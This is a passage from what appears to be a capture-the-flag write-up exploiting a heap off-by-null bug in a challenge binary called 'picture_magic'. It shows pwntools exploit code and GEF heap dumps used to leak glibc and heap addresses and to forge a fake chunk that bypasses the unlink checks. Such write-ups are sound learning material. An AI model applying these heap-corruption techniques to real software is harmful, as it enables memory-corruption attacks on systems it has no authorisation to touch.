+<span class="code-dark-yellow">0x55555555cc90: 0x0000000000000000 0x0000000000020371 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-yellow">0x55555555cca0: 0x000055555555c290 0x00007ffff7df6cc0 | ..UUUU...l...... |</span>
+<span class="code-dark-yellow">0x55555555ccb0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-yellow">0x55555555d190: 0x0000000000000500 0x0000000000000500 | ................ |</span>
+<span class="code-white">...</span>
+</code></pre></div><ul><li>Now, the next picture we allocate will have <code>0x000055555555c290</code> in <code>p->width</code> and <code>p->height</code> fields:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>continue
+Continuing.
+1
+
+Width: a
+Height: a
+
+Chosen size of (1431683728, 21845) cannot be used!  
+Picture must not exceed 1264 bytes!
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; ^C
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p/x 1431683728ul | (21845ul &lt;&lt; 32)  
+$1 = 0x55555555c290
+</code></pre></div><p>Having shown this, let&rsquo;s write it in the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">sell</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">sell</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'-&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Width: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Height: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Chosen size of '</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">width</span><span class="mtk1">, </span><span class="mtk1">height</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">literal_eval</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">')'</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">())</span>  
+<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> ((</span><span class="mtk1">height</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk6">32</span><span class="mtk1">) </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk1">width</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1f6cc0</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'-&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Width: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Height: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Chosen size of '</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">width</span><span class="mtk1">, </span><span class="mtk1">height</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">literal_eval</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">')'</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> ((</span><span class="mtk1">height</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk6">32</span><span class="mtk1">) </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk1">width</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">290</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Heap base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">heap_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+</code></pre></div><p>In addition, we can sell the remaining pictures we have to leave the heap like in the beginning:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">sell</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk8">sell</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
+</code></pre></div><h3 id="unlink-checks-bypass">Unlink checks bypass</h3><p>At this point, we have everything we need to perform the null byte poisoning attack. First of all, let&rsquo;s trigger the vulnerability:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)      </span><span class="mtk3"># A</span>  
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)      </span><span class="mtk3"># B</span>
+
+<span class="mtk1">    </span><span class="mtk8">sell</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">4f0</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">)  </span><span class="mtk3"># A</span>
+</code></pre></div><p>With this code, we are allocating 3 pictures (labelled <code>A</code>, <code>B</code>, in order as they appear in the heap). We free <code>A</code>, leaving <code>B</code> untouched (this is the victim chunk). Next, we allocate another picture with maximum size, so that the last null byte modifies the <code>PREV_INUSE</code> flag from <code>B</code>.</p><p>Before the off-by-null:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)<span class="code-blue">  &lt;-  unsortedbins[1/1]</span>
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+unsorted_bins[idx=0, size=any, @<span class="code-dark-green">0x7ffff7df6cd0</span>]: fd=<span class="code-dark-blue">0x55555555c290</span>, bk=<span class="code-dark-blue">0x55555555c290</span>
+ -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)
+<span class="code-blue">[+]</span> Found 1 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000000501 | ................ |  &lt;-  unsortedbins[1/1]</span>
+<span class="code-dark-green">0x55555555c2a0: 0x00007ffff7df6cc0 0x00007ffff7df6cc0 | .l.......l...... |</span>
+<span class="code-dark-green">0x55555555c2b0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-blue">0x55555555c790: 0x0000000000000500 0x0000000000000500 | ................ |</span>
+<span class="code-dark-blue">0x55555555c7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-yellow">0x55555555cc90: 0x0000000000000000 0x0000000000020371 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-yellow">0x55555555cca0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 8245 lines, 0x20350 bytes</span>
+</code></pre></div><p>After the off-by-null:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>continue
+Continuing.
+1
+
+Width: 1264
+Height: 1
+
+Reading picture into buffer:
+================================
+
+================================
+Successfully read picture!
+Picture has been assigned index 0.  
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; ^C
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x0004555551ac, bk=0x2020202020202020)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000000501 | ................ |</span>
+<span class="code-dark-green">0x55555555c2a0: 0x00000001000004f0 0x2020202020202020 | ........         |</span>
+<span class="code-dark-green">0x55555555c2b0: 0x2020202020202020 0x2020202020202020 |                  |</span>
+<span class="code-dark-green">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-blue">0x55555555c790: 0x0a20202020202020 0x0000000000000500 |        ......... |</span>
+<span class="code-dark-blue">0x55555555c7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-yellow">0x55555555cc90: 0x0000000000000000 0x0000000000020371 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-yellow">0x55555555cca0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 8245 lines, 0x20350 bytes</span>
+</code></pre></div><p>See how all the picture contains white spaces and new line characters, but the relevant byte is the null byte that has set <code>PREV_INUSE</code> to <code>0</code>.</p><p>At this point, we must put a negative <code>prev_size</code> that goes to the <code>name</code> buffer on the stack from this current chunk. For this, I wrote two helper functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">write_byte</span><span class="mtk1">(</span><span class="mtk9 mtki">b</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">column</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk8">transform</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk9 mtki">column</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'mul'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">transform</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">, </span><span class="mtk8">abs</span><span class="mtk1">(</span><span class="mtk9 mtki">b</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1">), </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk9 mtki">column</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'add'</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">b</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'sub'</span><span class="mtk1">)</span>  
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">write_qword</span><span class="mtk1">(</span><span class="mtk9 mtki">qword</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">, </span><span class="mtk9 mtki">offset</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">, </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">enumerate</span><span class="mtk1">(</span><span class="mtk9 mtki">qword</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk8">write_byte</span><span class="mtk1">(</span><span class="mtk1">b</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">, </span><span class="mtk9 mtki">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> (</span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">))</span>
+</code></pre></div><p><code>write_byte</code> first multiplies by <code>0</code>, so that we get a <code>0x20</code> byte there (null bytes are replaced by white spaces). Then, we add or substract in order to achieve the byte we want. The second function, <code>write_qword</code> takes an 8-byte buffer and writes it byte by byte in the offset we want (if different from zero).</p><p>As you may have noticed, to keep things simple, every picture has <code>p->width = 0</code> or <code>p->height = 0</code>, except for one that has <code>p->width = 0x4f0</code> and <code>p->height = 1</code>. As a result, we will use always <code>0</code> for rows, we only care about columns.</p><p>So, we can get a negative <code>prev_size</code> using the <a target="_blank" href="https://en.wikipedia.org/wiki/Two%27s_complement">two&rsquo;s complement</a> and write it on the <code>A</code> chunk at offset <code>0x4f0</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">two_c</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">lambda</span><span class="mtk1"> </span><span class="mtk9 mtki">n</span><span class="mtk1">: ((</span><span class="mtk5">~</span><span class="mtk1">(</span><span class="mtk8">abs</span><span class="mtk1">(</span><span class="mtk9 mtki">n</span><span class="mtk1">)) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffffffffffff</span><span class="mtk1">)</span>  
+
+<span class="mtk1">    </span><span class="mtk1">prev_size</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">two_c</span><span class="mtk1">(</span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">790</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">name_addr</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">write_qword</span><span class="mtk1">(p64(</span><span class="mtk1">prev_size</span><span class="mtk1">), </span><span class="mtk7 mtki">0x</span><span class="mtk6">4f0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+</code></pre></div><p>If we debug with GDB at this point, we will have this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './picture_magic'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Starting local process './picture_magic': pid 4186899
+[<span class="code-blue">*</span>] Name address: 0x7ffeba922820
+[<span class="code-green">+</span>] Glibc base address: 0x7f8280200000
+[<span class="code-green">+</span>] Heap base address: 0x555e78c98000
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './picture_magic', '4186899', '-x', '/tmp/pwnbsgc5h0m.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x555e78c98000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000555e78c98, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x555e78c98290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000455e78868, bk=0x2020202020202020)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x555e78c98790</span>, size=<span class="code-magenta">0x500</span>, flags=, fd=0x000555e78c98, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x555e78c98c90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x555e78c98290</span>, bk=<span class="code-dark-green">0x7f82803f6cc0</span>) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x555e78c98000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x555e78c98010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x555e78c98290: 0x0000000000000000 0x0000000000000501 | ................ |</span>
+<span class="code-dark-green">0x555e78c982a0: 0x00000001000004f0 0x2020202020202020 | ........         |</span>
+<span class="code-dark-green">0x555e78c982b0: 0x2020202020202020 0x2020202020202020 |                  |</span>
+<span class="code-dark-green">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-blue">0x555e78c98790: 0xffffd55fbe375f70 0x0000000000000500 | p_7._........... |</span>
+<span class="code-dark-blue">0x555e78c987a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-yellow">0x555e78c98c90: 0x0000000000000000 0x0000000000020371 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-yellow">0x555e78c98ca0: 0x0000555e78c98290 0x00007f82803f6cc0 | ...x^U...l?..... |</span>
+<span class="code-dark-yellow">0x555e78c98cb0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-yellow">0x555e78c99190: 0x0000000000000500 0x000000000001fe71 | ........q....... |</span>
+<span class="code-white">...</span>
+</code></pre></div><p>At this point, if we free the <code>B</code> chunk, the heap allocator will notice that <code>PREV_INUSE = 0</code> and will take the <code>prev_size</code> field to &ldquo;go up&rdquo; looking for the previous chunk in order to consolidate. However, we are confusing the heap, so &ldquo;going up&rdquo; is actually &ldquo;going down&rdquo; since <code>prev_size</code> is negative. Even more, the heap allocator will go to the <code>name</code> buffer. Here we will put a fake chunk because we need to satisfy some conditions.</p><p>Assuming we had a chunk at the <code>name</code> buffer, the heap allocator will take the <code>fd</code> pointer and check that it points to the chunk being merged (the fake chunk). The same will be tested on <code>bk</code> and two more fields known as <code>fd_nextsize</code> and <code>bk_nextsize</code>. Also, the fake chunk&rsquo;s size must match the <code>prev_size</code>. For more information, it is recommended to read <a target="_blank" href="https://sourceware.org/git/?p=glibc.git;a=summary">Glibc source code</a>.</p><p>So, we will add this:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">change</span><span class="mtk1">(p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">prev_size</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">name_addr</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">)</span>  
+</code></pre></div><p>We need to achieve something like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/10gx 0x7ffdf94aed90
+<span class="code-dark-blue">0x7ffdf94aed90</span>: 0x0000000000000000      0xffffd5d4b8842a00  
+<span class="code-dark-blue">0x7ffdf94aeda0</span>: 0x00007ffdf94aed90      0x00007ffdf94aed90
+<span class="code-dark-blue">0x7ffdf94aedb0</span>: 0x00007ffdf94aed90      0x00007ffdf94aed90
+<span class="code-dark-blue">0x7ffdf94aedc0</span>: 0x0000000000000000      0x1ca2e06effecfe00
+<span class="code-dark-blue">0x7ffdf94aedd0</span>: 0x0000000000000001      0x00007fe802e23510
